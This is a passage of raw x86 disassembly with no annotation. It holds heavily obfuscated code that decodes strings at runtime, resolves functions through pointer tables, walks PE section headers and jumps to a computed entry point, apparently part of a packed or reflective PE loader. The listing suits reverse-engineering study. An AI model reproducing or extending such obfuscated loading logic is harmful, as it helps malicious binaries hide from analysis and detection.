  427548:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427550:	jb     0x427529
  427552:	mov    ecx,0xf89c852b
  427557:	mov    DWORD PTR [ebp-0xb0],eax
  42755d:	mov    DWORD PTR [ebp-0x9c],eax
  427563:	mov    DWORD PTR [ebp-0x74],eax
  427566:	mov    DWORD PTR [ebp-0x70],eax
  427569:	lea    eax,[ecx-0x3]
  42756c:	mov    edx,0xf89c85ff
  427571:	mov    DWORD PTR [ebp-0x64],eax
  427574:	mov    DWORD PTR [ebp-0x60],eax
  427577:	mov    DWORD PTR [ebp-0xb4],0xf89c85f1
  427581:	mov    DWORD PTR [ebp-0xac],ecx
  427587:	mov    DWORD PTR [ebp-0xa8],edx
  42758d:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  427597:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  4275a1:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  4275ab:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  4275b5:	mov    DWORD PTR [ebp-0x90],0xf89c8529
  4275bf:	mov    DWORD PTR [ebp-0x8c],ecx
  4275c5:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  4275cf:	mov    DWORD PTR [ebp-0x84],edx
  4275d5:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  4275dc:	mov    DWORD PTR [ebp-0x7c],ecx
  4275df:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  4275e6:	mov    DWORD PTR [ebp-0x6c],ecx
  4275e9:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  4275f0:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  4275f7:	xor    eax,eax
  4275f9:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427600:	xor    cl,0xaa
  427603:	sub    cl,0xf
  427606:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  42760d:	inc    eax
  42760e:	cmp    eax,0x17
  427611:	jb     0x4275f9
  427613:	mov    eax,DWORD PTR [ebx+0x1e0]
  427619:	lea    ecx,[ebp-0xc0]
  42761f:	push   ecx
  427620:	call   DWORD PTR [eax+0x4]
  427623:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427629:	lea    edx,[ebp-0xd8]
  42762f:	push   edx
  427630:	push   eax
  427631:	call   DWORD PTR [ecx+0x8]
  427634:	mov    DWORD PTR [ebp-0x40],eax
  427637:	lea    eax,[ebp-0x14]
  42763a:	push   eax
  42763b:	mov    eax,DWORD PTR [ebx+0x18c]
  427641:	push   DWORD PTR [eax]
  427643:	mov    eax,DWORD PTR [ebp-0x40]
  427646:	call   eax
  427648:	mov    eax,DWORD PTR [ebp-0x4]
  42764b:	xor    eax,esi
  42764d:	add    eax,edi
  42764f:	mov    DWORD PTR [ebp-0x34],eax
  427652:	mov    ecx,DWORD PTR [ebp-0x4]
  427655:	mov    eax,DWORD PTR [ebp-0x14]
  427658:	xor    ecx,esi
  42765a:	add    ecx,edi
  42765c:	cmp    eax,ecx
  42765e:	je     0x4276a9
  427660:	mov    DWORD PTR [ebp-0x3c],eax
  427663:	jmp    0x427674
  427665:	mov    eax,DWORD PTR [eax]
  427667:	mov    ecx,DWORD PTR [ebp-0x3c]
  42766a:	mov    DWORD PTR [ebp-0x14],eax
  42766d:	mov    eax,DWORD PTR [ebp-0x14]
  427670:	cmp    eax,ecx
  427672:	je     0x427681
  427674:	mov    edx,DWORD PTR [eax+0x18]
  427677:	mov    ecx,DWORD PTR [ebx+0x18c]
  42767d:	cmp    edx,DWORD PTR [ecx]
  42767f:	jne    0x427665
  427681:	mov    ecx,DWORD PTR [ebx+0x18c]
  427687:	mov    edx,DWORD PTR [eax+0x18]
  42768a:	cmp    edx,DWORD PTR [ecx]
  42768c:	jne    0x4276a9
  42768e:	mov    ecx,DWORD PTR [ebx+0x190]
  427694:	mov    edx,DWORD PTR [ebp-0x20]
  427697:	mov    edx,DWORD PTR [edx+0x28]
  42769a:	add    edx,DWORD PTR [ecx]
  42769c:	mov    DWORD PTR [eax+0x1c],edx
  42769f:	mov    eax,DWORD PTR [ebp-0x24]
  4276a2:	xor    eax,esi
  4276a4:	add    eax,edi
  4276a6:	mov    DWORD PTR [ebp-0x34],eax
  4276a9:	mov    eax,DWORD PTR [ebp+0xc]
  4276ac:	push   ebx
  4276ad:	push   eax
  4276ae:	push   DWORD PTR [ebp+0x20]
  4276b1:	call   0x426e2f
  4276b6:	test   eax,eax
  4276b8:	je     0x427781
  4276be:	push   DWORD PTR [ebp+0xc]
  4276c1:	mov    ecx,ebx
  4276c3:	push   DWORD PTR [ebp+0x20]
  4276c6:	call   0x426d88
  4276cb:	test   eax,eax
  4276cd:	je     0x427781
  4276d3:	mov    eax,DWORD PTR [ebp+0xc]
  4276d6:	mov    edx,DWORD PTR [ebp+0x20]
  4276d9:	mov    ecx,ebx
  4276db:	call   0x426c61
  4276e0:	test   eax,eax
  4276e2:	je     0x427781
  4276e8:	push   ebx
  4276e9:	push   DWORD PTR [ebp+0x20]
  4276ec:	call   0x427112
  4276f1:	test   eax,eax
  4276f3:	je     0x427781
  4276f9:	mov    eax,DWORD PTR [ebx+0x18c]
  4276ff:	mov    edx,DWORD PTR [ebp+0x20]
  427702:	cmp    edx,DWORD PTR [eax]
  427704:	jne    0x427720
  427706:	mov    eax,DWORD PTR [ebx+0x1e0]
  42770c:	lea    ecx,[ebp-0x18]
  42770f:	push   ecx
  427710:	push   DWORD PTR [ebp-0x18]
  427713:	mov    ecx,DWORD PTR [ebp-0x20]
  427716:	push   DWORD PTR [ecx+0x54]
  427719:	push   edx
  42771a:	call   DWORD PTR [eax+0x1c]
  42771d:	mov    edx,DWORD PTR [ebp+0x20]
  427720:	mov    eax,DWORD PTR [ebx+0x1c8]
  427726:	mov    eax,DWORD PTR [eax]
  427728:	xor    eax,esi
  42772a:	add    eax,edi
  42772c:	je     0x427765
  42772e:	mov    ecx,DWORD PTR [ebp+0xc]
  427731:	mov    eax,DWORD PTR [ecx+0x28]
  427734:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  42773b:	mov    esi,DWORD PTR [ebp+0x8]
  42773e:	push   DWORD PTR [ebp+0x14]
  427741:	xor    esi,0x8aa
  427747:	push   DWORD PTR [ebp+0x10]
  42774a:	add    esi,0x72f1
  427750:	or     WORD PTR [ecx+0x16],si
  427754:	add    eax,edx
  427756:	push   edx
  427757:	call   eax
  427759:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  427763:	jmp    0x42776f
  427765:	mov    eax,DWORD PTR [ebp+0xc]
  427768:	mov    eax,DWORD PTR [eax+0x28]
  42776b:	add    eax,edx
  42776d:	call   eax
  42776f:	mov    DWORD PTR [ebp-0x8],eax
  427772:	mov    eax,DWORD PTR [ebp-0x8]
  427775:	mov    ecx,DWORD PTR [ebp+0x1c]
  427778:	mov    DWORD PTR [ecx],eax
  42777a:	mov    DWORD PTR [ebp-0x30],0x1
  427781:	cmp    DWORD PTR [ebp-0x30],0x0
  427785:	jne    0x42778b
  427787:	and    DWORD PTR [ebp+0x20],0x0
  42778b:	mov    eax,DWORD PTR [ebp+0x20]
  42778e:	jmp    0x427792
  427790:	xor    eax,eax
  427792:	pop    edi
  427793:	pop    esi
  427794:	pop    ebx
  427795:	leave  
  427796:	ret    0x1c
  427799:	push   ebp
  42779a:	mov    ebp,esp
  42779c:	movzx  edx,WORD PTR [ecx+0x6]
  4277a0:	movzx  eax,WORD PTR [ecx+0x14]
  4277a4:	push   ebx
  4277a5:	push   edi
  4277a6:	xor    edi,edi
  4277a8:	lea    eax,[eax+ecx*1+0x18]
  4277ac:	test   edx,edx
  4277ae:	je     0x4277cf
  4277b0:	mov    ecx,DWORD PTR [eax+0xc]
  4277b3:	lea    ebx,[ecx+esi*1]
  4277b6:	cmp    DWORD PTR [ebp+0x8],ebx
  4277b9:	jb     0x4277c7
  4277bb:	mov    ebx,DWORD PTR [eax+0x8]
  4277be:	add    ebx,ecx
  4277c0:	add    ebx,esi
  4277c2:	cmp    DWORD PTR [ebp+0x8],ebx
  4277c5:	jb     0x4277d1
  4277c7:	add    eax,0x28
  4277ca:	inc    edi
  4277cb:	cmp    edi,edx
  4277cd:	jb     0x4277b0
  4277cf:	xor    eax,eax
  4277d1:	pop    edi
  4277d2:	pop    ebx
  4277d3:	pop    ebp
  4277d4:	ret    0x4
  4277d7:	push   ebp
  4277d8:	mov    ebp,esp
  4277da:	sub    esp,0x34
  4277dd:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4277e4:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  4277eb:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  4277f2:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  4277f9:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  427800:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  427807:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  42780e:	mov    DWORD PTR [ebp-0x10],eax
  427811:	mov    eax,DWORD PTR [ebp+0x8]
  427814:	mov    DWORD PTR [ebp-0x14],eax
  427817:	mov    eax,DWORD PTR [ebp-0xc]
  42781a:	push   ebx
  42781b:	mov    ecx,0x75108aa
  427820:	xor    eax,ecx
  427822:	push   esi
  427823:	mov    esi,DWORD PTR [ebp-0x10]
  427826:	mov    edx,0x3272f1
  42782b:	add    eax,edx
  42782d:	push   edi
  42782e:	cmp    esi,eax
  427830:	je     0x427a0f
  427836:	mov    eax,DWORD PTR [ebp-0xc]
  427839:	mov    esi,DWORD PTR [ebp-0x14]
  42783c:	xor    eax,ecx
  42783e:	add    eax,edx
  427840:	cmp    esi,eax
  427842:	je     0x427a0f
  427848:	mov    eax,DWORD PTR [ebp-0xc]
  42784b:	xor    eax,ecx
  42784d:	add    eax,edx
  42784f:	mov    DWORD PTR [ebp-0x24],eax
  427852:	mov    eax,DWORD PTR [ebp-0xc]
  427855:	xor    eax,ecx
  427857:	add    eax,edx
  427859:	mov    DWORD PTR [ebp-0x28],eax
  42785c:	mov    edi,DWORD PTR [ebp-0x20]
  42785f:	mov    ebx,DWORD PTR [ebp-0x8]
  427862:	mov    esi,0x8aa
  427867:	xor    edi,esi
  427869:	mov    eax,0x72f1
  42786e:	xor    ebx,esi
  427870:	add    edi,eax
  427872:	add    ebx,eax
  427874:	sub    ebx,edi
  427876:	mov    WORD PTR [ebp-0x8],bx
  42787a:	jmp    0x42793f
  42787f:	mov    edi,DWORD PTR [ebp-0xc]
  427882:	mov    bx,WORD PTR [ebp-0x4]
  427886:	xor    edi,esi
  427888:	add    edi,eax
  42788a:	cmp    bx,di
  42788d:	je     0x427981
  427893:	mov    edi,DWORD PTR [ebp-0xc]
  427896:	mov    ebx,DWORD PTR [ebp+0xc]
  427899:	xor    edi,ecx
  42789b:	add    edi,edx
  42789d:	cmp    ebx,edi
  42789f:	mov    di,WORD PTR [ebp-0x4]
  4278a3:	mov    bx,WORD PTR [ebp+0x8]
  4278a7:	je     0x427912
  4278a9:	cmp    bx,di
  4278ac:	je     0x42791b
  4278ae:	mov    edi,DWORD PTR [ebp-0x20]
  4278b1:	mov    bx,WORD PTR [ebp+0x8]
  4278b5:	xor    edi,esi
  4278b7:	add    edi,eax
  4278b9:	cmp    bx,di
  4278bc:	jb     0x4278dc
  4278be:	mov    edi,DWORD PTR [ebp-0x2c]
  4278c1:	mov    bx,WORD PTR [ebp+0x8]
  4278c5:	xor    edi,esi
  4278c7:	add    edi,eax
  4278c9:	cmp    bx,di
  4278cc:	ja     0x4278dc
  4278ce:	movzx  edi,WORD PTR [ebp+0x8]
  4278d2:	movzx  ebx,WORD PTR [ebp-0x8]
  4278d6:	add    edi,ebx
  4278d8:	mov    WORD PTR [ebp+0x8],di
  4278dc:	mov    edi,DWORD PTR [ebp-0x20]
  4278df:	mov    bx,WORD PTR [ebp-0x4]
  4278e3:	xor    edi,esi
  4278e5:	add    edi,eax
  4278e7:	cmp    bx,di
  4278ea:	jb     0x42790a
  4278ec:	mov    edi,DWORD PTR [ebp-0x2c]
  4278ef:	mov    bx,WORD PTR [ebp-0x4]
  4278f3:	xor    edi,esi
  4278f5:	add    edi,eax
  4278f7:	cmp    bx,di
  4278fa:	ja     0x42790a
  4278fc:	movzx  edi,WORD PTR [ebp-0x4]
  427900:	movzx  ebx,WORD PTR [ebp-0x8]
  427904:	add    edi,ebx
  427906:	mov    WORD PTR [ebp-0x4],di
  42790a:	mov    di,WORD PTR [ebp-0x4]
  42790e:	mov    bx,WORD PTR [ebp+0x8]
  427912:	cmp    bx,di
  427915:	jne    0x427a0f
  42791b:	mov    edi,DWORD PTR [ebp-0x1c]
  42791e:	mov    ebx,DWORD PTR [ebp-0x10]
  427921:	xor    edi,ecx
  427923:	lea    edi,[edi+ebx*1+0x3272f1]
  42792a:	mov    DWORD PTR [ebp-0x10],edi
  42792d:	mov    edi,DWORD PTR [ebp-0x1c]
  427930:	mov    ebx,DWORD PTR [ebp-0x14]
  427933:	xor    edi,ecx
  427935:	lea    edi,[edi+ebx*1+0x3272f1]
  42793c:	mov    DWORD PTR [ebp-0x14],edi
  42793f:	mov    edi,DWORD PTR [ebp-0x24]
  427942:	mov    ebx,DWORD PTR [ebp-0x10]
  427945:	mov    di,WORD PTR [ebx+edi*2]
  427949:	mov    WORD PTR [ebp+0x8],di
  42794d:	mov    edi,DWORD PTR [ebp-0x28]
  427950:	mov    ebx,DWORD PTR [ebp-0x14]
  427953:	mov    di,WORD PTR [ebx+edi*2]
  427957:	mov    WORD PTR [ebp-0x4],di
  42795b:	mov    edi,DWORD PTR [ebp-0xc]
  42795e:	mov    bx,WORD PTR [ebp+0x8]
  427962:	xor    edi,esi
  427964:	add    edi,eax
  427966:	cmp    bx,di
  427969:	jne    0x42787f
  42796f:	mov    eax,DWORD PTR [ebp-0x18]
  427972:	mov    esi,DWORD PTR [ebp-0xc]
  427975:	xor    eax,ecx
  427977:	add    eax,edx
  427979:	imul   eax,esi
  42797c:	mov    DWORD PTR [ebp-0xc],eax
  42797f:	jmp    0x427993
  427981:	mov    eax,DWORD PTR [ebp-0xc]
  427984:	mov    esi,DWORD PTR [ebp-0x18]
  427987:	xor    eax,ecx
  427989:	lea    eax,[eax+esi*1+0x3272f1]
  427990:	mov    DWORD PTR [ebp-0x18],eax
  427993:	mov    eax,DWORD PTR [ebp-0x24]
  427996:	sub    eax,edx
  427998:	xor    eax,ecx
  42799a:	mov    DWORD PTR [ebp-0x30],eax
  42799d:	mov    eax,DWORD PTR [ebp-0x28]
  4279a0:	sub    eax,edx
  4279a2:	xor    eax,ecx
  4279a4:	mov    DWORD PTR [ebp-0x34],eax
  4279a7:	mov    eax,DWORD PTR [ebp-0x34]
  4279aa:	mov    esi,DWORD PTR [ebp-0x1c]
  4279ad:	xor    esi,ecx
  4279af:	add    esi,edx
  4279b1:	xor    eax,ecx
  4279b3:	add    eax,0x3272f1
  4279b8:	imul   esi,eax
  4279bb:	mov    eax,DWORD PTR [ebp-0x14]
  4279be:	movzx  eax,WORD PTR [esi+eax*1]
  4279c2:	mov    esi,DWORD PTR [ebp-0x30]
  4279c5:	mov    edi,DWORD PTR [ebp-0x1c]
  4279c8:	xor    esi,ecx
  4279ca:	add    esi,edx
  4279cc:	xor    edi,ecx
  4279ce:	add    edi,edx
  4279d0:	imul   edi,esi
  4279d3:	mov    esi,DWORD PTR [ebp-0x10]
  4279d6:	movzx  esi,WORD PTR [edi+esi*1]
  4279da:	sub    eax,edx
  4279dc:	sub    esi,edx
  4279de:	xor    eax,ecx
  4279e0:	xor    esi,ecx
  4279e2:	cmp    esi,eax
  4279e4:	jne    0x427a0f
  4279e6:	mov    eax,DWORD PTR [ebp-0x30]
  4279e9:	mov    esi,DWORD PTR [ebp-0x1c]
  4279ec:	xor    eax,ecx
  4279ee:	add    eax,0x3272f1
  4279f3:	xor    esi,ecx
  4279f5:	add    esi,edx
  4279f7:	imul   esi,eax
  4279fa:	mov    eax,DWORD PTR [ebp-0x10]
  4279fd:	movzx  eax,WORD PTR [esi+eax*1]
  427a01:	mov    esi,DWORD PTR [ebp-0xc]
  427a04:	sub    eax,edx
  427a06:	xor    eax,ecx
  427a08:	cmp    eax,esi
  427a0a:	mov    eax,DWORD PTR [ebp-0xc]
  427a0d:	je     0x427a12
  427a0f:	mov    eax,DWORD PTR [ebp-0x18]
  427a12:	pop    edi
  427a13:	xor    eax,ecx
  427a15:	pop    esi
  427a16:	add    eax,edx
  427a18:	pop    ebx
  427a19:	leave  
  427a1a:	ret    0x8
  427a1d:	push   ebp
  427a1e:	mov    ebp,esp
  427a20:	push   ecx
  427a21:	mov    cx,WORD PTR [eax]
  427a24:	push   esi
  427a25:	mov    esi,0x3b5a
  427a2a:	sub    cx,si
  427a2d:	mov    esi,0x8a98
  427a32:	xor    cx,si
  427a35:	mov    esi,0x4e3e
  427a3a:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427a41:	mov    edx,0xf89c85a5
  427a46:	cmp    cx,si
  427a49:	je     0x427aa8
  427a4b:	push   ebx
  427a4c:	push   edi
  427a4d:	movzx  ecx,cx
  427a50:	mov    edi,0xffcd8d0f
  427a55:	mov    esi,0x75108aa
  427a5a:	mov    ebx,0x4f9a
  427a5f:	cmp    cx,bx
  427a62:	jne    0x427a67
  427a64:	mov    DWORD PTR [ebp-0x4],edx
  427a67:	lea    edx,[edi+0x1]
  427a6a:	xor    edx,esi
  427a6c:	mov    edi,edx
  427a6e:	xor    edi,esi
  427a70:	mov    cx,WORD PTR [eax+edi*2+0x64e5e2]
  427a78:	mov    ebx,0x3b5a
  427a7d:	sub    cx,bx
  427a80:	mov    ebx,0x8a98
  427a85:	xor    cx,bx
  427a88:	mov    ebx,0x4e3e
  427a8d:	cmp    cx,bx
  427a90:	jne    0x427a5a
  427a92:	mov    ecx,DWORD PTR [ebp-0x4]
  427a95:	pop    edi
  427a96:	pop    ebx
  427a97:	cmp    ecx,0xf89c85a4
  427a9d:	je     0x427aa8
  427a9f:	xor    ecx,esi
  427aa1:	lea    eax,[eax+ecx*2+0x64e5e4]
  427aa8:	pop    esi
  427aa9:	leave  
  427aaa:	ret    
  427aab:	push   ebp
  427aac:	mov    ebp,esp
  427aae:	push   ecx
  427aaf:	push   esi
  427ab0:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427ab7:	mov    esi,0xf89c85a5
  427abc:	call   0x427a1d
  427ac1:	mov    cl,BYTE PTR [eax]
  427ac3:	dec    cl
  427ac5:	xor    cl,0x7c
  427ac8:	cmp    cl,0x83
  427acb:	je     0x427b30
  427acd:	push   ebx
  427ace:	push   edi
  427acf:	mov    edx,eax
  427ad1:	mov    edi,0xffcd8d0f
  427ad6:	mov    ecx,0x75108aa
  427adb:	mov    dx,WORD PTR [edx]
  427ade:	mov    ebx,0x3b5a
  427ae3:	sub    dx,bx
  427ae6:	mov    ebx,0x8a98
  427aeb:	xor    dx,bx
  427aee:	mov    ebx,0x4e4c
  427af3:	cmp    dx,bx
  427af6:	jne    0x427afb
  427af8:	mov    DWORD PTR [ebp-0x4],esi
  427afb:	lea    esi,[edi+0x1]
  427afe:	xor    esi,ecx
  427b00:	mov    edi,esi
  427b02:	xor    edi,ecx
  427b04:	lea    edx,[eax+edi*2+0x64e5e2]
  427b0b:	mov    bl,BYTE PTR [edx]
  427b0d:	dec    bl
  427b0f:	xor    bl,0x7c
  427b12:	cmp    bl,0x83
  427b15:	jne    0x427adb
  427b17:	mov    edx,DWORD PTR [ebp-0x4]
  427b1a:	pop    edi
  427b1b:	pop    ebx
  427b1c:	cmp    edx,0xf89c85a4
  427b22:	je     0x427b30
  427b24:	xor    edx,ecx
  427b26:	xor    ecx,ecx
  427b28:	mov    WORD PTR [eax+edx*2+0x64e5e2],cx
  427b30:	pop    esi
  427b31:	leave  
  427b32:	ret    
  427b33:	push   ebp
  427b34:	mov    ebp,esp
  427b36:	push   ecx
  427b37:	push   esi
  427b38:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427b3f:	mov    esi,0xf89c85a5
  427b44:	call   0x427a1d
  427b49:	mov    cx,WORD PTR [eax]
  427b4c:	mov    edx,0x3b5a
  427b51:	sub    cx,dx
  427b54:	mov    edx,0x8a98
  427b59:	xor    cx,dx
  427b5c:	mov    edx,0x4e3e
  427b61:	cmp    cx,dx
  427b64:	je     0x427bbd
  427b66:	push   ebx
  427b67:	push   edi
  427b68:	movzx  ecx,cx
  427b6b:	mov    edx,0xffcd8d0f
  427b70:	mov    edi,0x75108aa
  427b75:	mov    ebx,0x4e4c
  427b7a:	cmp    cx,bx
  427b7d:	jne    0x427b82
  427b7f:	mov    DWORD PTR [ebp-0x4],esi
  427b82:	lea    esi,[edx+0x1]
  427b85:	xor    esi,edi
  427b87:	mov    edx,esi
  427b89:	xor    edx,edi
  427b8b:	mov    cx,WORD PTR [eax+edx*2+0x64e5e2]
  427b93:	mov    ebx,0x3b5a
  427b98:	sub    cx,bx
  427b9b:	mov    ebx,0x8a98
  427ba0:	xor    cx,bx
  427ba3:	mov    ebx,0x4e3e
  427ba8:	cmp    cx,bx
  427bab:	jne    0x427b75
  427bad:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  427bb4:	pop    edi
  427bb5:	pop    ebx
  427bb6:	je     0x427bbd
  427bb8:	xor    eax,eax
  427bba:	inc    eax
  427bbb:	jmp    0x427bbf
  427bbd:	xor    eax,eax
  427bbf:	pop    esi
  427bc0:	leave  
  427bc1:	ret    
  427bc2:	push   ebp
  427bc3:	mov    ebp,esp
  427bc5:	push   ecx
  427bc6:	mov    eax,DWORD PTR [ebp+0x8]
  427bc9:	movzx  ecx,WORD PTR [eax]
  427bcc:	push   esi
  427bcd:	lea    eax,[ecx-0x3b5a]
  427bd3:	mov    esi,0x8a98
  427bd8:	push   edi
  427bd9:	xor    eax,esi
  427bdb:	mov    edi,0x4e3e
  427be0:	mov    DWORD PTR [ebp-0x4],edx
  427be3:	cmp    ax,di
  427be6:	je     0x427c13
  427be8:	mov    eax,DWORD PTR [ebp+0x8]
  427beb:	sub    eax,edx
  427bed:	mov    DWORD PTR [ebp+0x8],eax
  427bf0:	jmp    0x427bf5
  427bf2:	mov    eax,DWORD PTR [ebp+0x8]
  427bf5:	mov    WORD PTR [edx],cx
  427bf8:	add    edx,0x2
  427bfb:	movzx  edi,WORD PTR [eax+edx*1]
  427bff:	mov    ecx,edi
  427c01:	add    edi,0xffffc4a6
  427c07:	xor    edi,esi
  427c09:	mov    eax,0x4e3e
  427c0e:	cmp    di,ax
  427c11:	jne    0x427bf2
  427c13:	xor    eax,eax
  427c15:	pop    edi
  427c16:	mov    WORD PTR [edx],ax
  427c19:	mov    eax,DWORD PTR [ebp-0x4]
  427c1c:	pop    esi
  427c1d:	leave  
  427c1e:	ret    0x4
  427c21:	push   ebp
  427c22:	mov    ebp,esp
  427c24:	sub    esp,0x18
  427c27:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  427c2e:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427c35:	mov    ecx,DWORD PTR [ebp-0x8]
  427c38:	push   esi
  427c39:	mov    eax,0x75108aa
  427c3e:	xor    ecx,eax
  427c40:	mov    esi,0x3272f1
  427c45:	add    ecx,esi
  427c47:	mov    DWORD PTR [ebp-0x4],ecx
  427c4a:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  427c51:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427c58:	push   edi
  427c59:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  427c60:	jmp    0x427d01
  427c65:	mov    ecx,DWORD PTR [ebp-0x4]
  427c68:	mov    edx,DWORD PTR [ebp+0x10]
  427c6b:	sub    edx,ecx
  427c6d:	mov    ecx,DWORD PTR [ebp-0xc]
  427c70:	xor    ecx,eax
  427c72:	add    ecx,esi
  427c74:	cmp    edx,ecx
  427c76:	jbe    0x427c93
  427c78:	mov    edx,DWORD PTR [ebp-0x4]
  427c7b:	add    edx,DWORD PTR [ebp+0x8]
  427c7e:	mov    ecx,DWORD PTR [ebp-0x4]
  427c81:	add    ecx,DWORD PTR [ebp+0xc]
  427c84:	mov    edi,DWORD PTR [ecx]
  427c86:	mov    DWORD PTR [edx],edi
  427c88:	mov    ecx,DWORD PTR [ecx+0x4]
  427c8b:	mov    DWORD PTR [edx+0x4],ecx
  427c8e:	mov    ecx,DWORD PTR [ebp-0xc]
  427c91:	jmp    0x427ce0
  427c93:	mov    ecx,DWORD PTR [ebp-0x4]
  427c96:	mov    edx,DWORD PTR [ebp+0x10]
  427c99:	sub    edx,ecx
  427c9b:	mov    ecx,DWORD PTR [ebp-0x10]
  427c9e:	xor    ecx,eax
  427ca0:	add    ecx,esi
  427ca2:	cmp    edx,ecx
  427ca4:	mov    ecx,DWORD PTR [ebp-0x4]
  427ca7:	jbe    0x427cbb
  427ca9:	add    ecx,DWORD PTR [ebp+0x8]
  427cac:	mov    edx,DWORD PTR [ebp-0x4]
  427caf:	add    edx,DWORD PTR [ebp+0xc]
  427cb2:	mov    edx,DWORD PTR [edx]
  427cb4:	mov    DWORD PTR [ecx],edx
  427cb6:	mov    ecx,DWORD PTR [ebp-0x10]
  427cb9:	jmp    0x427ce0
  427cbb:	mov    edx,DWORD PTR [ebp+0x10]
  427cbe:	sub    edx,ecx
  427cc0:	mov    ecx,DWORD PTR [ebp-0x14]
  427cc3:	xor    ecx,eax
  427cc5:	add    ecx,esi
  427cc7:	cmp    edx,ecx
  427cc9:	mov    ecx,DWORD PTR [ebp-0x4]
  427ccc:	jbe    0x427cf1
  427cce:	add    ecx,DWORD PTR [ebp+0x8]
  427cd1:	mov    edx,DWORD PTR [ebp-0x4]
  427cd4:	add    edx,DWORD PTR [ebp+0xc]
  427cd7:	mov    dx,WORD PTR [edx]
  427cda:	mov    WORD PTR [ecx],dx
  427cdd:	mov    ecx,DWORD PTR [ebp-0x14]
  427ce0:	mov    edx,DWORD PTR [ebp-0x4]
  427ce3:	xor    ecx,eax
  427ce5:	lea    ecx,[ecx+edx*1+0x3272f1]
  427cec:	mov    DWORD PTR [ebp-0x4],ecx
  427cef:	jmp    0x427d01
  427cf1:	add    ecx,DWORD PTR [ebp+0x8]
  427cf4:	mov    edx,DWORD PTR [ebp-0x4]
  427cf7:	add    edx,DWORD PTR [ebp+0xc]
  427cfa:	mov    dl,BYTE PTR [edx]
  427cfc:	mov    BYTE PTR [ecx],dl
  427cfe:	inc    DWORD PTR [ebp-0x4]
  427d01:	mov    ecx,DWORD PTR [ebp-0x18]
  427d04:	mov    edx,DWORD PTR [ebp+0x10]
  427d07:	xor    ecx,eax
  427d09:	add    ecx,esi
  427d0b:	imul   ecx,edx
  427d0e:	mov    edx,DWORD PTR [ebp-0x8]
  427d11:	mov    edi,DWORD PTR [ebp-0x4]
  427d14:	xor    edx,eax
  427d16:	lea    edx,[edx+edi*1+0x3272f1]
  427d1d:	cmp    edx,ecx
  427d1f:	jb     0x427c65
  427d25:	pop    edi
  427d26:	pop    esi
  427d27:	leave  
  427d28:	ret    0xc
  427d2b:	push   ebp
  427d2c:	mov    ebp,esp
  427d2e:	sub    esp,0xc
  427d31:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427d38:	push   esi
  427d39:	mov    esi,eax
  427d3b:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  427d42:	mov    edx,DWORD PTR [ebp-0x4]
  427d45:	mov    eax,0x75108aa
  427d4a:	xor    edx,eax
  427d4c:	mov    ecx,0x3272f1
  427d51:	add    edx,ecx
  427d53:	cmp    esi,edx
  427d55:	je     0x427d97
  427d57:	push   ebx
  427d58:	push   edi
  427d59:	mov    edx,DWORD PTR [ebp-0x8]
  427d5c:	mov    ebx,DWORD PTR [ebp+0x8]
  427d5f:	xor    edx,eax
  427d61:	mov    edi,0xffcd8d0f
  427d66:	sub    edi,edx
  427d68:	add    esi,edi
  427d6a:	lea    edx,[esi-0x3272f1]
  427d70:	xor    edx,eax
  427d72:	mov    DWORD PTR [ebp-0xc],edx
  427d75:	mov    edx,DWORD PTR [ebp-0x4]
  427d78:	mov    edi,DWORD PTR [ebp-0xc]
  427d7b:	xor    dl,0xaa
  427d7e:	sub    dl,0xf
  427d81:	xor    edi,eax
  427d83:	mov    BYTE PTR [edi+ebx*1+0x3272f1],dl
  427d8a:	mov    edx,DWORD PTR [ebp-0x4]
  427d8d:	xor    edx,eax
  427d8f:	add    edx,ecx
  427d91:	cmp    esi,edx
  427d93:	jne    0x427d59
  427d95:	pop    edi
  427d96:	pop    ebx
  427d97:	pop    esi
  427d98:	leave  
  427d99:	ret    0x4
  427d9c:	push   ebp
  427d9d:	mov    ebp,esp
  427d9f:	sub    esp,0x21c
  427da5:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427dac:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  427db3:	mov    eax,DWORD PTR [ebp+0x10]
  427db6:	mov    eax,DWORD PTR [ebp-0x4]
  427db9:	mov    ecx,DWORD PTR [ebp+0x8]
  427dbc:	push   esi
  427dbd:	push   edi
  427dbe:	mov    edi,0x75108aa
  427dc3:	xor    eax,edi
  427dc5:	mov    esi,0x3272f1
  427dca:	add    eax,esi
  427dcc:	cmp    eax,ecx
  427dce:	mov    eax,DWORD PTR [ebp-0x4]
  427dd1:	jne    0x427ddc
  427dd3:	xor    eax,edi
  427dd5:	add    eax,esi
  427dd7:	jmp    0x427e88
  427ddc:	mov    ecx,DWORD PTR [ebp+0xc]
  427ddf:	xor    eax,edi
  427de1:	add    eax,esi
  427de3:	cmp    eax,ecx
  427de5:	jne    0x427dec
  427de7:	mov    eax,DWORD PTR [ebp-0x4]
  427dea:	jmp    0x427dd3
